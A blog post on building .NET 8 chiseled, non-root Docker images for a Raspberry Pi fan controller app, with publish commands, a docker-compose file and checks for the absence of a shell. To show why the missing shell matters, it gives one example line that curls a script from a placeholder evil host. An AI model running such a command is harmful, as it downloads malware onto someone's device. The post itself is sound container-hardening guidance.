---
layout: post
title: Using chiseled base images for a .NET app on a Raspberry Pi
description: Make your apps more secure by limiting the container's capabilities
comment_issue_id: 24
---

[In the last post]({{ site.baseurl }}/2024/01/21/SDK-container-building-tools.html), I showed you how to use the .NET SDK Container Building Tools that ship with .NET 8 to make building Docker images easier by removing the `Dockerfile` clutter.  
In this post, I want to show you how this became handy when migrating one of my apps to Docker.

## Introducing the _Raspi Fan Controller_ project

Some years ago, I bought a Raspberry Pi 4 and while getting into touch with this neat mini computer, I read several times that it might get pretty hot and should better be run with a heat sink. So I decided to attach a small CPU fan and build a custom fan controller software based on .NET ([read more about it here]({{ site.baseurl }}/2020/04/24/Raspi-Fan-Controller_p1)) - the [Raspi Fan Controller project](https://github.com/mu88/RaspiFanController).

At the very beginning, I deployed it as a self-contained executable (no need to install .NET) on bare metal. However, since all of my other apps are running in Docker, I decided to containerize it, too.  
The most tricky piece of this containerization was to learn about how to map the necessary paths and devices (like the Raspi's GPIO pins) into a container. Finally, I found a working solution with a lot of help from the community and so the _Raspi Fan Controller_ was running inside a container, too.

## Chiseled base images for .NET

To be honest: when I first read the word _chiseled_, I thought about it being a typo 😅 it came to my attention when reading another excellent blog post from Rich Landers: [Announcing .NET Chiseled Containers](https://devblogs.microsoft.com/dotnet/announcing-dotnet-chiseled-containers/)

If you never heard about it, here's my very brief takeaway of the concept: Docker images are made up of layers and the lowest layers are very similar to a lightweight OS and contain necessary vital libraries and tools (e. g. a shell).  
When running a container, however, it might not always be necessary to have a shell. Even more, consider a malicious component inside the container being able to run a shell and download and execute further malware via `curl https://this.is.evil/killThisDevice.ps1`.  
Chiseled images mitigate those issues by two approaches:
1. They are non-root by default (so you can't run `apt install` to install further tools).
2. They are stripped down to the bare minimum (there isn't even the `apt` tool nor a shell).

This way, a malicious component can do way less harm.

Microsoft provides chiseled base images for .NET for Ubuntu Jammy and they are tagged with the suffix `-chiseled`, e. g. `mcr.microsoft.com/dotnet/aspnet:8.0-jammy-chiseled`.

Another neat benefit of chiseled images is that they are way smaller. That makes sense as they contain less tools and are stripped down. For example, the ASP.NET Core 8 image for Ubuntu Jammy is 216 MB big - the chiseled counterpart only 110 MB.

## And why do you care?

Well, that's a perfect question! One could definitely argue that in my private home network, the chance of a malicious attack might be negligible. On the other hand, it's a nice apprentice piece to get used to the technology and better safe than sorry.

## Using chiseled images for the _Raspi Fan Controller_ project

Since I had already containerized my project and made use of the .NET SDK Container Building Tools, providing a chiseled variant is fairly easy:

{% highlight shell %}

dotnet publish --os linux --arch arm64 /t:PublishContainer \
    -p:ContainerRegistry=registry.hub.docker.com \
    '-p:ContainerImageTags="1.0.0;latest"'

dotnet publish --os linux --arch arm64 /t:PublishContainer \
    -p:ContainerRegistry=registry.hub.docker.com \
    '-p:ContainerImageTags="1.0.0-chiseled;latest-chiseled"' \
    -p:ContainerFamily=jammy-chiseled

{% endhighlight %}

The first command we already know from the first blog post: it builds a Docker image for the Raspi's `arm64` architecture, using the non-chiseled base images by default.  
For the second command, the parameter `ContainerFamily` is set to `jammy-chiseled` and that instructs the .NET SDK Container Building Tools to use the chiseled base image. To easily distinguish it, I use dedicated tags with the suffix `-chiseled`.

## Running the chiseled image

To create a Docker container from the chiseled image, the following `docker-compose.yml` can be used:

{% highlight yaml %}

version: '3'
services:
  raspifancontroller:
    container_name: raspifancontroller
    image: mu88/raspifancontroller:latest-chiseled
    ports:
      - 127.0.0.1:5000:8080
    user: "1654:997" # group 997 is necessary to access the GPIO pins
    volumes:
      - /sys/class/thermal/thermal_zone0:/sys/class/thermal/thermal_zone0:ro # CpuTemperature needs this
    devices:
      - /dev/gpiomem

{% endhighlight %}

Let's dissect it piece by piece:
- The previously created image `mu88/raspifancontroller:latest-chiseled` is pulled and the container named `raspifancontroller` exposes its port `8080` via `5000` to the host. So far, this is basic ASP.NET Core 8.
- The user ID (UID) is set to `1654`. This is a _magic number_ for the new `app` user with non-root capabilities - another .NET 8 feature (read more about it here: [Secure your .NET cloud apps with rootless Linux Containers](https://devblogs.microsoft.com/dotnet/securing-containers-with-rootless/))
- The user's group ID (GID) is set to `997`. This is the first important piece to notice as this group has the necessary permissions to control the Raspi's GPIO pins.
- The host file `/sys/class/thermal/thermal_zone0` is mapped into the container as read-only (notice the `:ro` suffix). This file contains the Raspi's current CPU temperature and is necessary for the fan controller.
- Lastly, the device `/dev/gpiomem` is mapped which actually represents the GPIO pins.

When running `docker compose up -d`, a Docker container will be started.

## See chiseled in action

Let's recap the benefits of chiseled images from the beginning:
- non-root by default
- reduced to the bare minimum (i. e. no shell)

Let's validate these statements!

### No shell

If there'd be a shell, we could connect to the container via `docker exec -it <<container>> bash`, so let's try it:

{% highlight shell %}
myUser@myRaspi:~ $ docker exec -it raspifancontroller bash
OCI runtime exec failed: exec failed: unable to start container process: exec: "bash": executable file not found in $PATH: unknown
{% endhighlight %}

Nice, we get an error indicating that there is no shell ✅

### Non-root by default

If there's no shell, how can we validate that the user has only limited permissions and cannot execute commands like `apt install`? We can check with a Docker command which user ID the process running inside the container has, because on Linux, the `root` user always has the UID `0`.

{% highlight shell %}
myUser@myRaspi:~ $ docker top raspifancontroller
UID    PID   PPID  C  STIME  TTY  TIME      CMD
1654  1796  1704  1  Mar22  ?    04:15:47  dotnet RaspiFanController.dll
{% endhighlight %}

Cool, we see that the .NET assembly `RaspiFanController.dll` is running with the `app`'s UID `1654`, i. e. as non-root ✅

## Closing

And with that, I want to close this mini-series about non-root and chiseled containers, built with the .NET SDK Container Building Tools.

I hope you enjoyed it - have a great time and take care 👋🏻

PS: I'm very proud that some parts of this journey even made it into the official Microsoft docs: [Control GPIO pins within rootless Docker container on Raspberry Pi](https://github.com/dotnet/iot/blob/main/Documentation/raspi-Docker-GPIO.md)
